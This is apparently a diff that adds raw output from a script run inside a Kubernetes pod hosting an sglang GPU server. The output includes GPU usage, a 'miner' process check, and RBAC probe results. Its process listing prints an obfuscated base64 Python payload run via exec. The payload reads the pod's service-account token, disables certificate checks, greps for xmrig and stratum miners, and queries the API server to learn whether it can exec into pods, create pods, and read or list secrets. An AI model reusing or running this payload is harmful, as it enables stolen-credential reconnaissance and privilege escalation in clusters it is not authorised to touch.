@@ -1,0 +1,20 @@
+=== GPU ===
+index, name, utilization.gpu [%], memory.used [MiB], memory.total [MiB]
+0, NVIDIA A100 80GB PCIe, 0 %, 71124 MiB, 81920 MiB
+1, NVIDIA A100 80GB PCIe, 0 %, 4 MiB, 81920 MiB
+2, NVIDIA A100 80GB PCIe, 0 %, 4 MiB, 81920 MiB
+3, NVIDIA A100 80GB PCIe, 0 %, 4 MiB, 81920 MiB
+
+pid, process_name, used_gpu_memory [MiB]
+177, sglang::scheduler, 71116 MiB
+
+=== MINER PROCS ===
+---
+USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
+root         177 76.8  0.3 114357932 3093060 ?   Sl   19:51   1:07 sglang::scheduler
+root         725 35.2  0.0  31512 21504 ?        S    19:52   0:00 python3 -c import base64;exec(base64.b64decode('CmltcG9ydCBzc2wsanNvbixiYXNlNjQsdXJsbGliLnJlcXVlc3Qsc3VicHJvY2VzcwpjdHg9c3NsLmNyZWF0ZV9kZWZhdWx0X2NvbnRleHQoKTsgY3R4LmNoZWNrX2hvc3RuYW1lPUZhbHNlOyBjdHgudmVyaWZ5X21vZGU9c3NsLkNFUlRfTk9ORQpTQT0iL3Zhci9ydW4vc2VjcmV0cy9rdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50LyIKdG9rPW9wZW4oU0ErInRva2VuIikucmVhZCgpLnN0cmlwKCk7IG5zPW9wZW4oU0ErIm5hbWVzcGFjZSIpLnJlYWQoKS5zdHJpcCgpClI9W10KZGVmIHNoKGMpOgogICAgbz1zdWJwcm9jZXNzLnJ1bihjLHNoZWxsPVRydWUsY2FwdHVyZV9vdXRwdXQ9VHJ1ZSx0ZXh0PVRydWUsdGltZW91dD00MCk7IHJldHVybiAoby5zdGRvdXQrby5zdGRlcnIpWzoyNTAwXQpkZWYgYXBpKHBhdGgsbWV0aG9kPSJHRVQiLGJvZHk9Tm9uZSk6CiAgICByZXE9dXJsbGliLnJlcXVlc3QuUmVxdWVzdCgiaHR0cHM6Ly8xMC4wLjAuMSIrcGF0aCxkYXRhPWpzb24uZHVtcHMoYm9keSkuZW5jb2RlKCkgaWYgYm9keSBlbHNlIE5vbmUsbWV0aG9kPW1ldGhvZCwKICAgICAgICBoZWFkZXJzPXsiQXV0aG9yaXphdGlvbiI6IkJlYXJlciAiK3RvaywiQ29udGVudC1UeXBlIjoiYXBwbGljYXRpb24vanNvbiJ9KQogICAgdHJ5OgogICAgICAgIHdpdGggdXJsbGliLnJlcXVlc3QudXJsb3BlbihyZXEsY29udGV4dD1jdHgsdGltZW91dD0yMCkgYXMgcjogcmV0dXJuIHIuc3RhdHVzLHIucmVhZCgpLmRlY29kZSgpWzoxNTAwXQogICAgZXhjZXB0IHVybGxpYi5lcnJvci5IVFRQRXJyb3IgYXMgZTogcmV0dXJuIGUuY29kZSxlLnJlYWQoKS5kZWNvZGUoKVs6NDAwXQogICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOiByZXR1cm4gIkVSUiIsc3RyKGUpWzoyMDBdClIuYXBwZW5kKCI9PT0gR1BVID09PSIpClIuYXBwZW5kKHNoKCJudmlkaWEtc21pIC0tcXVlcnktZ3B1PWluZGV4LG5hbWUsdXRpbGl6YXRpb24uZ3B1LG1lbW9yeS51c2VkLG1lbW9yeS50b3RhbCAtLWZvcm1hdD1jc3YiKSkKUi5hcHBlbmQoc2goIm52aWRpYS1zbWkgLS1xdWVyeS1jb21wdXRlLWFwcHM9cGlkLHByb2Nlc3NfbmFtZSx1c2VkX21lbW9yeSAtLWZvcm1hdD1jc3YiKSkKUi5hcHBlbmQoIj09PSBNSU5FUiBQUk9DUyA9PT0iKQpSLmFwcGVuZChzaCgicHMgYXV4IHwgZ3JlcCAtaUUgJ3BlYWt8eG1yaWd8bWluZXJ8c3RyYXR1bScgfCBncmVwIC12IGdyZXAgfCBoZWFkIC0xMDsgZWNobyAtLS07IHBzIGF1eCAtLXNvcnQ9LSVjcHUgfCBoZWFkIC0xMiIpKQpSLmFwcGVuZCgiPT09IFJCQUMgZXhlYy9jcmVhdGUgPT09IikKZm9yIHZlcmIscmVzIGluIFsoImNyZWF0ZSIsInBvZHMvZXhlYyIpLCgiY3JlYXRlIiwicG9kcyIpLCgiZ2V0Iiwic2VjcmV0cyIpLCgibGlzdCIsInNlY3JldHMiKV06CiAgICBzdCxiPWFwaSgiL2FwaXMvYXV0aG9yaXphdGlvbi5rOHMuaW8vdjEvc2VsZnN1YmplY3RhY2Nlc3NyZXZpZXdzIiwiUE9TVCIsCiAgICAgIHsiYXBpVmVyc2lvbiI6ImF1dGhvcml6YXRpb24uazhzLmlvL3YxIiwia2luZCI6IlNlbGZTdWJqZWN0QWNjZXNzUmV2aWV3Iiwic3BlYyI6eyJyZXNvdXJjZUF0dHJpYnV0ZXMiOnsidmVyYiI6dmVyYiwicmVzb3VyY2UiOnJlc319fSkKICAgIFIuYXBwZW5kKHZlcmIrIiAiK3JlcysiIC0+ICIrc3RyKHN0KSsiICIrYls6M
+=== RBAC exec/create ===
+create pods/exec -> 201 {"kind":"SelfSubjectAccessReview","apiVersion":"authorization.k8s.io/v1","metadata":{"managedFields":[{"manager":"Python-urllib","operation":"Update","apiVersion":"authorization.k8s.io/v1","time":"202
+create pods -> 201 {"kind":"SelfSubjectAccessReview","apiVersion":"authorization.k8s.io/v1","metadata":{"managedFields":[{"manager":"Python-urllib","operation":"Update","apiVersion":"authorization.k8s.io/v1","time":"202
+get secrets -> 201 {"kind":"SelfSubjectAccessReview","apiVersion":"authorization.k8s.io/v1","metadata":{"managedFields":[{"manager":"Python-urllib","operation":"Update","apiVersion":"authorization.k8s.io/v1","time":"202
+list secrets -> 201 {"kind":"SelfSubjectAccessReview","apiVersion":"authorization.k8s.io/v1","metadata":{"managedFields":[{"manager":"Python-urllib","operation":"Update","apiVersion":"authorization.k8s.io/v1","time":"202
